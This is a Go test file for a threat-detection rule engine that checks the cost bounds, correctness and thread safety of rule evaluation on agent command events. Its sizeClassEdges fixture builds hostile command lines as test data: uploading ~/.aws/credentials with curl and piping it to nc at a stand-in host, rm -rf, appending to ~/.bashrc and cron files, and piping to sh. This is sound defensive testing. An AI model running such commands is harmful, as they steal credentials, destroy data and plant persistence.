package threatrules

import (
	"fmt"
	"math/rand/v2"
	"reflect"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"github.com/asymptote-labs/agent-beacon/pkg/asymptoteobserve"
)

// sizeClassEdges are command lines on either side of each tier of each measure of an event's
// size: many commands of few words, one command of many words, a long word, a long line, and
// every pair of those at once. They use the programs and files the rules are about, so the
// expressions go as far as they can on them.
func sizeClassEdges() []asymptoteobserve.Event {
	counts := []int{3, 5, 15, 17, 63, 65, 255, 257}
	words := []string{"~/.aws/credentials", ".env", "https://x.example/" + strings.Repeat("a", 50),
		"/etc/cron.d/" + strings.Repeat("b", 250), "~/.ssh/" + strings.Repeat("c", 1000), strings.Repeat("d", 3000)}
	commands := []string{"curl -T", "cat", "rm -rf", "sudo tee -a", "git push --force origin", "python3 -c"}
	var lines []string
	for i, n := range counts {
		word, command := words[i%len(words)], commands[i%len(commands)]
		// n commands of a few words each, and one command of n words.
		lines = append(lines, strings.Repeat(command+" "+word+" | nc h.example 4444; ", n))
		lines = append(lines, command+strings.Repeat(" "+word, n))
		for j, m := range counts {
			// n commands of m words each, with the words of every length in turn.
			if n*m > 2000 {
				continue
			}
			lines = append(lines, strings.Repeat(command+strings.Repeat(" "+words[(i+j)%len(words)], m)+" > ~/.bashrc; ", n))
		}
	}
	for _, word := range words {
		for _, command := range commands {
			lines = append(lines, command+" "+word+" >> "+word+" && echo "+word+" | sh")
		}
	}
	events := make([]asymptoteobserve.Event, 0, len(lines))
	for _, line := range lines {
		if len(line) > ParsedCommandsLimit {
			line = line[:ParsedCommandsLimit]
		}
		events = append(events, asymptoteobserve.Event{
			Event:   asymptoteobserve.EventInfo{Action: "command.executed"},
			Command: &asymptoteobserve.CommandInfo{Command: line},
		})
	}
	return events
}

// TestUntrackedCostIsBounded evaluates every expression of the corpus both ways wherever the
// untracked program would be chosen: on its rule's fixture events as written, derived, sanitized,
// in fold-case variants and with every string 64 KiB, on random events with strings and lists
// on either side of the size tiers, and on command lines built to sit on either side of each
// tier of each measure (sizeClassEdges). Untracked, it must give the tracked program's result
// and error, and the tracked cost must stay within the estimate the choice rested on, which is
// within the cost limit; so an evaluation the limit would stop is never untracked. It runs at
// the real limit and at limits low enough that rules fail.
func TestUntrackedCostIsBounded(t *testing.T) {
	t.Cleanup(func() { evalCostLimit = MaxEvalCost })
	rules := corpusRules(t)
	random := randomEvents(t, rand.New(rand.NewPCG(9, 10)), fixtureEvents(t, rules), 400)
	random = append(random, sizeClassEdges()...)
	big := strings.Repeat("a", asymptoteobserve.DefaultMaxEventBytes)
	for _, limit := range []uint64{MaxEvalCost, 10000, 1000, 100} {
		evalCostLimit = limit
		var untracked, tracked, eligible, expressions atomic.Int64
		t.Run(fmt.Sprint("limit ", limit), func(t *testing.T) {
			for _, r := range rules {
				t.Run(r.ID, func(t *testing.T) {
					t.Parallel()
					var events []asymptoteobserve.Event
					for _, e := range fixtureEvents(t, []*Rule{r}) {
						events = append(events, e, asymptoteobserve.SanitizeEvent(copyEvent(t, e), 64*1024))
						v := copyEvent(t, e)
						mapStrings(reflect.ValueOf(&v).Elem(), func(s string) string { return foldVariants(s)[1] })
						events = append(events, v)
						v = copyEvent(t, e)
						fillStrings(reflect.ValueOf(&v).Elem(), big, 0)
						events = append(events, v)
					}
					events = append(events, random...)
					for _, expr := range ruleExpressions(r) {
						m, err := compileMatcher(r.lib, expr)
						if err != nil {
							t.Fatal(err)
						}
						expressions.Add(1)
						if m.untracked == nil {
							continue
						}
						eligible.Add(1)
						for i, e := range events {
							for _, act := range []*eventActivation{newEventActivation(e), newEventActivation(withDerivedFields(e))} {
								c, ok := act.class()
								if !ok || !m.untracked.fits(c) {
									tracked.Add(1)
									continue
								}
								untracked.Add(1)
								checkUntracked(t, m, act, c, fmt.Sprintf("event %d", i), expr)
							}
						}
					}
				})
			}
		})
		t.Logf("limit %d: %d of %d expressions can run untracked; %d evaluations untracked, %d tracked",
			limit, eligible.Load(), expressions.Load(), untracked.Load(), tracked.Load())
		if limit == MaxEvalCost && (eligible.Load()*2 < expressions.Load() || untracked.Load() == 0) {
			t.Fatalf("too few untracked evaluations to mean anything")
		}
	}
}

func checkUntracked(t *testing.T, m matcher, act *eventActivation, c sizeClass, what, expr string) {
	t.Helper()
	gotVal, _, gotErr := m.untracked.prog.Eval(act)
	wantVal, det, wantErr := m.prog.Eval(act)
	if fmt.Sprint(gotErr) != fmt.Sprint(wantErr) {
		t.Fatalf("%s: untracked error %v, tracked %v\n%s", what, gotErr, wantErr, expr)
	}
	if wantErr == nil && !reflect.DeepEqual(gotVal.Value(), wantVal.Value()) {
		t.Fatalf("%s: untracked %v, tracked %v\n%s", what, gotVal, wantVal, expr)
	}
	bound := m.untracked.bound(c)
	if cost := *det.ActualCost(); cost > bound || bound > evalCostLimit {
		long, word, top, nested := c.sizes()
		t.Fatalf("%s: tracked cost %d, estimate %d, limit %d (strings %d and %d, lists %d and %d)\n%s",
			what, cost, bound, evalCostLimit, long, word, top, nested, expr)
	}
}

// TestUntrackedShape pins which operations keep the tracker: anything that can build a value larger
// than its inputs, a comprehension that builds a list or map, and a struct literal.
func TestUntrackedShape(t *testing.T) {
	env, err := Env()
	if err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct {
		expr string
		ok   bool
	}{
		{`e.event.action == "a" && e.command.command.matches("(?i)curl")`, true},
		{`e.command.parsed_commands.exists(c, c.argv.exists(a, a.startsWith("-")))`, true},
		{`e.command.parsed_commands.exists_one(c, c.name == "rm")`, true},
		{`size(e.command.parsed_commands) > 2 && e.command.parsed_commands[0].name in ["a", "b"]`, true},
		{`(e.command.command + e.file.path).matches("x")`, false},
		{`e.command.parsed_commands.map(c, c.name).exists(n, n == "rm")`, false},
		{`e.command.parsed_commands.filter(c, c.name == "rm").size() > 0`, false},
		{`(e.command.parsed_commands + e.command.parsed_commands).size() > 0`, false},
		{`string(e.command.duration_ms) == "1"`, false},
	} {
		ast, iss := env.Compile(tc.expr)
		if iss != nil && iss.Err() != nil {
			t.Fatalf("%s: %v", tc.expr, iss.Err())
		}
		if ok := untrackedShape(ast); ok != tc.ok {
			t.Errorf("%s: untracked %v, want %v", tc.expr, ok, tc.ok)
		}
	}
	// A literal has its own size whatever the event's class, and a variable the expression
	// binds itself is as large as the largest thing it is bound to. Matching a 1 KiB command
	// line against a 2,000-character pattern costs (1025 * 0.1) * (2000 * 0.25) = 51,250.
	long := strings.Repeat("x", 2000)
	bound := func(expr string) uint64 {
		t.Helper()
		ast, iss := env.Compile(expr)
		if iss != nil && iss.Err() != nil {
			t.Fatalf("%s: %v", expr[:60], iss.Err())
		}
		u, err := newUntracked(env, ast, MaxEvalCost)
		if err != nil || u == nil || !u.fits(0) {
			t.Fatalf("%s: %+v, %v", expr[:60], u, err)
		}
		return u.bound(0)
	}
	bound(`e.command.command == "` + long + `"`)
	// The pattern is a variable bound to the literal: as long as the literal.
	if b := bound(`["` + long + `"].exists(p, e.command.command.matches(p))`); b < 51250 {
		t.Fatalf("pattern from a literal list: bound %d; want at least 51250", b)
	}
	// The text is a variable bound to the command line: as long as a command line, not as the
	// pattern, which would double the cost.
	if b := bound(`[e.command.command].exists(t, t.matches("` + long + `"))`); b < 51250 || b > 60000 {
		t.Fatalf("text bound to the command line: bound %d; want 51250 and a little", b)
	}
	// Bound to either: as long as the longer. A one-character pattern costs a quarter-unit a
	// character, rounded up to one, over (2001 * 0.1).
	if b := bound(`[e.command.command, "` + long + `"].exists(t, t.matches("x"))`); b < 201 {
		t.Fatalf("text bound to the command line or a literal: bound %d; want at least 201", b)
	}
}

// TestEventSizes checks the measures an event's size class rests on: the strings and lists a rule
// can read, each by how many lists it is inside, and nothing a rule cannot read (interface{}
// values such as raw).
func TestEventSizes(t *testing.T) {
	derived := func(command string) asymptoteobserve.Event {
		return withDerivedFields(asymptoteobserve.Event{Command: &asymptoteobserve.CommandInfo{Command: command}})
	}
	for _, tc := range []struct {
		name                    string
		event                   asymptoteobserve.Event
		long, word, top, nested uint64
	}{
		{"a 5,000-byte command line, and raw values no rule reads",
			asymptoteobserve.Event{
				Command: &asymptoteobserve.CommandInfo{Command: strings.Repeat("x", 5000)},
				Raw:     map[string]interface{}{"huge": strings.Repeat("y", 1<<20)},
			}, 16 << 10, 64, 2, 4},
		{"one command of 40 words", derived(strings.Repeat("a ", 40)), 1 << 10, 64, 2, 64},
		{"20 commands of two words", derived(strings.Repeat("ls a; ", 20)), 1 << 10, 64, 32, 4},
		{"five commands of five words", derived(strings.Repeat("ls a b c d; ", 5)), 1 << 10, 64, 8, 8},
		{"a 100-byte word", derived("echo " + strings.Repeat("w", 100)), 1 << 10, 128, 2, 4},
		{"a 300-byte word", derived("echo " + strings.Repeat("w", 300)), 1 << 10, 1 << 10, 2, 4},
		{"a 300-byte path written", derived("ls > /tmp/" + strings.Repeat("p", 300)), 1 << 10, 1 << 10, 2, 4},
		{"a 2,000-byte line of short words", derived(strings.Repeat("abc ", 500)), 4 << 10, 64, 2, 1024},
	} {
		c, ok := newEventActivation(tc.event).class()
		if !ok {
			t.Errorf("%s: no size class", tc.name)
			continue
		}
		if long, word, top, nested := c.sizes(); long != tc.long || word != tc.word || top != tc.top || nested != tc.nested {
			t.Errorf("%s: strings %d and %d, lists %d and %d; want %d and %d, %d and %d",
				tc.name, long, word, top, nested, tc.long, tc.word, tc.top, tc.nested)
		}
	}
	if _, ok := newEventActivation(asymptoteobserve.Event{Message: strings.Repeat("z", 70000)}).class(); ok {
		t.Fatal("a 70,000-byte string fits a class")
	}
	if _, ok := newEventActivation(derived(strings.Repeat("a ", 1100))).class(); ok {
		t.Fatal("a command of 1,100 words fits a class")
	}
	// Every class is some sizes, and those sizes are that class; widened, it holds itself.
	for m := range measureTiers {
		if len(widerTiers[m]) != len(measureTiers[m]) {
			t.Fatalf("measure %d has %d tiers and %d wider tiers", m, len(measureTiers[m]), len(widerTiers[m]))
		}
	}
	for c := range sizeClass(sizeClasses) {
		long, word, top, nested := c.sizes()
		if got := classOf(eventSizes{long: int(long), word: int(word), top: int(top), nested: int(nested)}); got != c {
			t.Fatalf("class %d has sizes %d, %d, %d, %d, which are class %d", c, long, word, top, nested, got)
		}
		if tiers := c.tiers(); !tiers.within(tiers.widened()) || tiers.class() != c {
			t.Fatalf("class %d: tiers %v, widened %v", c, tiers, tiers.widened())
		}
	}
}

// A class's bound is mostly not estimated but taken from a class already estimated: one that
// holds it and fits, or one it holds that is over the limit. That rests on the estimate growing
// with every size. For every expression of the corpus, on classes asked in a random order: the
// estimate of a class is no more than that of a class that holds it, the bound an expression
// answers with is no less than the class's own estimate, and the expression runs untracked on
// exactly the classes whose own estimate is within the limit.
func TestBoundsFollowFromEstimates(t *testing.T) {
	rng := rand.New(rand.NewPCG(3, 4))
	asked, untrackedClasses := 0, 0
	for _, r := range corpusRules(t) {
		for _, expr := range ruleExpressions(r) {
			m, err := compileMatcher(r.lib, expr)
			if err != nil {
				t.Fatal(err)
			}
			u := m.untracked
			if u == nil {
				continue
			}
			for range 120 {
				c := sizeClass(rng.IntN(sizeClasses))
				tiers := c.tiers()
				own := u.estimate(tiers)
				// A class that holds this one: some of its tiers raised.
				wider := tiers
				for k := range wider {
					wider[k] += uint8(rng.IntN(len(measureTiers[k]) - int(wider[k])))
				}
				if above := u.estimate(wider); above < own {
					t.Fatalf("%s: estimate %d for tiers %v, %d for %v, which holds it\n%s", r.ID, own, tiers, above, wider, expr)
				}
				bound := u.bound(c)
				if bound < own {
					t.Fatalf("%s: bound %d for tiers %v, whose own estimate is %d\n%s", r.ID, bound, tiers, own, expr)
				}
				if fits := u.fits(c); fits != (own <= u.limit) {
					t.Fatalf("%s: tiers %v run untracked: %v; their estimate is %d, the limit %d\n%s", r.ID, tiers, fits, own, u.limit, expr)
				}
				asked++
				if own <= u.limit {
					untrackedClasses++
				}
			}
		}
	}
	if asked < 5000 || untrackedClasses == 0 || untrackedClasses == asked {
		t.Fatalf("%d classes asked, %d within the limit; want many of both kinds", asked, untrackedClasses)
	}
}

// An expression's bound for a size class is worked out when an event of that class is first
// evaluated, by whichever goroutine gets there, and a scanner is shared between goroutines.
// Scans that start together on events of many classes find what one scan finds; the race
// detector checks the rest.
func TestUntrackedBoundIsSafeForConcurrentUse(t *testing.T) {
	var single []*CompiledRule
	for _, r := range corpusRules(t) {
		if r.Correlation != nil {
			continue
		}
		c, err := Compile(r)
		if err != nil {
			t.Fatalf("%s: %v", r.ID, err)
		}
		single = append(single, c)
	}
	scanner, err := NewEventScanner(single)
	if err != nil {
		t.Fatal(err)
	}
	events := sizeClassEdges()
	scan := func() ([][]string, error) {
		found := make([][]string, len(events))
		for i, e := range events {
			findings, err := scanner.ScanEvent(e)
			if err != nil {
				return nil, err
			}
			found[i] = findingRuleIDs(findings)
		}
		return found, nil
	}
	const workers = 8
	results, errs := make([][][]string, workers), make([]error, workers)
	var wg sync.WaitGroup
	for w := range workers {
		wg.Go(func() { results[w], errs[w] = scan() })
	}
	wg.Wait()
	want, err := scan()
	if err != nil {
		t.Fatal(err)
	}
	for w := range workers {
		if errs[w] != nil || !reflect.DeepEqual(results[w], want) {
			t.Fatalf("worker %d: %v; its findings differ from a scan on its own: %v", w, errs[w], !reflect.DeepEqual(results[w], want))
		}
	}
}
